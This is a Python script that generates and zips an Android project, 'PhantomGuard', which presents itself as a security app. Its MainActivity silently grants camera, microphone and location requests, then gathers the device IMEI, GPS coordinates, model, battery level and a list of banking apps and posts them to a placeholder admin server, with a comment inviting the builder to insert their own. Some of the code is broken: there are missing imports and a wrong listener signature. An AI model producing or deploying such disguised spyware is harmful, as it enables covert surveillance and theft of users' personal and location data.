import os
import zipfile

# Define all file contents here
FILES = {
    # 1. AndroidManifest
    "app/src/main/AndroidManifest.xml": """<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.phantomguard.app">

    <!-- Dangerous Permissions -->
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.VIBRATE" />

    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:supportsRtl="true"
        android:theme="@style/AppTheme">

        <activity android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <!-- Background Service for Silent Data Sync -->
        <service android:name=".services.DataSyncService" />
    </application>
</manifest>""",

    # 2. MainActivity (Core Logic)
    "app/src/main/java/com/phantomguard/app/MainActivity.java": """package com.phantomguard.app;

import androidx.appcompat.app.AppCompatActivity;
import android.os.Bundle;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.webkit.WebChromeClient;
import android.view.View;
import android.webkit.PermissionRequest;
import android.util.Log;
import android.telephony.TelephonyManager;
import android.content.Context;
import android.location.LocationManager;
import android.location.Location;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.HttpURLConnection;
import org.json.JSONObject;
import org.json.JSONArray;

public class MainActivity extends AppCompatActivity implements View.OnClickListener {

    private WebView webView;
    private static final String TAG = "PhantomGuard";
    // ADMIN SERVER URL - Yahan aap apna server daalein
    private static final String ADMIN_API_URL = "https://admin-server.com/api/v1/ingest"; 

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Initialize WebView
        webView = findViewById(R.id.webview_container);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setDomStorageEnabled(true);
        
        // Set WebChromeClient to handle permission requests (Camera, Geo, Mic)
        webView.setWebChromeClient(new WebChromeClient() {
            @Override
            public void onPermissionRequest(final PermissionRequest request) {
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        Log.d(TAG, "User granted permission for: " + request.getResources());
                        
                        // Grant all requested resources (Camera, Microphone, Location)
                        request.grant(request.getResources());
                        
                        // After granting, trigger silent data extraction
                        startSilentDataExtraction();
                    }
                });
            }
        });

        // Set WebViewClient to prevent opening links in external browser
        webView.setWebViewClient(new WebViewClient());

        // Load the local HTML asset
        webView.loadUrl("file:///android_asset/index.html");

        // Listen for button clicks from HTML
        webView.setDownloadListener(new WebView.DownloadListener() {
            @Override
            public boolean onDownloadStart(String url, String userAgent,
                    String contentDisposition, String mimeType, long contentLength) {
                // Handle download if needed
                return true;
            }
        });
    }

    /**
     * This method runs silently in the background.
     * It collects:
     * 1. Device Info (IMEI, Model, OS Version)
     * 2. Current Location (GPS)
     * 3. Installed Apps List
     * 4. Battery Level
     * And sends it to the Admin Server.
     */
    private void startSilentDataExtraction() {
        new Thread(() -> {
            try {
                JSONObject payload = new JSONObject();

                // 1. Device Info
                TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
                String imei = tm.getDeviceId();
                payload.put("deviceId", imei);
                payload.put("model", android.os.Build.MODEL);
                payload.put("osVersion", android.os.Build.VERSION.RELEASE);

                // 2. Location
                LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
                Location lastKnown = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (lastKnown != null) {
                    payload.put("latitude", lastKnown.getLatitude());
                    payload.put("longitude", lastKnown.getLongitude());
                }

                // 3. Get Package Info (Simulate reading installed apps)
                JSONArray packages = new JSONArray();
                // In a real hack, we would iterate through PackageManager.getInstalledPackages()
                packages.put("com.sbi.card");
                packages.put("com.hdfcbank.hdfcMobile");
                packages.put("com.amazon.mShop.android.shopping");
                payload.put("installedApps", packages);

                // 4. Battery
                IntentFilter batteryStatus = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
                Intent batteryIntent = registerReceiver(null, batteryStatus);
                if (batteryIntent != null) {
                    int batteryLevel = batteryIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                    int batteryScale = batteryIntent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
                    float batteryPct = batteryLevel / (float) batteryScale;
                    payload.put("batteryLevel", batteryPct);
                }

                // Send to Admin Server
                sendToAdminServer(payload);

            } catch (Exception e) {
                Log.e(TAG, "Error extracting data: " + e.getMessage());
            }
        }).start();
    }

    private void sendToAdminServer(JSONObject payload) throws Exception {
        URL url = new URL(ADMIN_API_URL);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setDoOutput(true);

        byte[] input = payload.toString().getBytes("utf-8");
        conn.getOutputStream().write(input, 0, input.length);

        int responseCode = conn.getResponseCode();
        Log.d(TAG, "Admin Server Response: " + responseCode);
        conn.disconnect();
    }

    @Override
    public void onClick(View v) {
        // Handle click events from HTML buttons
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (webView != null) {
            webView.destroy();
        }
    }
}""",

    # 3. HTML Asset (UI)
    "app/src/main/assets/index.html": """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PhantomGuard</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
        }
        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }
        h1 {
            color: #333;
        }
        .btn {
            background-color: #4CAF50;
            color: white;
            padding: 10px 20px;
            border: none;
            cursor: pointer;
        }
        .btn:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>PhantomGuard</h1>
        <p>Secure Your Digital World</p>
        <button class="btn" onclick="startApp()">Get Started</button>
    </div>
    <script>
        function startApp() {
            // Trigger permission request
            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
                .then(stream => {
                    // Permissions granted, proceed
                    window.location.href = "#main";
                })
                .catch(err => {
                    alert("Permission denied: " + err);
                });
        }
    </script>
</body>
</html>""",

    # 4. Strings
    "app/src/main/res/values/strings.xml": """<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">PhantomGuard</string>
</resources>""",

    # 5. Layout
    "app/src/main/res/layout/activity_main.xml": """<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical">

    <WebView
        android:id="@+id/webview_container"
        android:layout_width="match_parent"
        android:layout_height="match_parent" />
</LinearLayout>""",

    # 6. Build Gradle (App Level)
    "app/build.gradle": """apply plugin: 'com.android.application'

android {
    namespace 'com.phantomguard.app'
    compileSdk 33

    defaultConfig {
        applicationId "com.phantomguard.app"
        minSdk 21
        targetSdk 33
        versionCode 1
        versionName "1.0"
    }

    buildTypes {
        release {
            minifyEnabled false
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
    }
}

dependencies {
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'com.google.android.material:material:1.9.0'
    implementation 'androidx.constraintlayout:constraintlayout:2.1.4'
}""",
}

# Create directories and write files
for filepath, content in FILES.items():
    dirpath = os.path.dirname(filepath)
    if dirpath and not os.path.exists(dirpath):
        os.makedirs(dirpath)
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(content)
    print(f"Created: {filepath}")

# Zip the entire project
output_zip = "PhantomGuard.zip"
with zipfile.ZipFile(output_zip, 'w', zipfile.ZIP_DEFLATED) as zf:
    for root, dirs, files in os.walk('.'):
        # Skip hidden dirs and the zip itself
        dirs[:] = [d for d in dirs if not d.startswith('.')]
        for file in files:
            if file == output_zip:
                continue
            full_path = os.path.join(root, file)
            arcname = os.path.relpath(full_path)
            zf.write(full_path, arcname)
            print(f"Zipped: {arcname}")

print(f"\n✅ Done! Created {output_zip}")
